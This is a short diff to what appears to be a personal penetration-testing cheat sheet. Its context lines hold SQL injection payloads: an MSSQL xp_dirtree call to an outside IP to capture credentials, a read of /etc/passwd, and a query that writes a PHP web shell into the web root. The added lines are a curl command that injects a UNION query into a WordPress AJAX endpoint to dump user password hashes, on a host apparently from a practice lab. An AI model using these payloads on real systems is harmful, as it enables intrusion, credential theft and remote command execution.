@@ -353,7 +353,10 @@ admin');exec+master.dbo.xp_dirtree+'\\192.168.119.152\test,3,2';+--
 select load_file('/etc/passwd');
 select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/shell.php';
 ```
-
+```bash
+curl -X POST -d "action=spAjaxResults&pollid=-7159 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,user_pass,NULL from wordpress_db.wp_users --" http://sunset-midnight/wp-admin/admin-ajax.php
+```
+	
 ### LFI
 https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
 
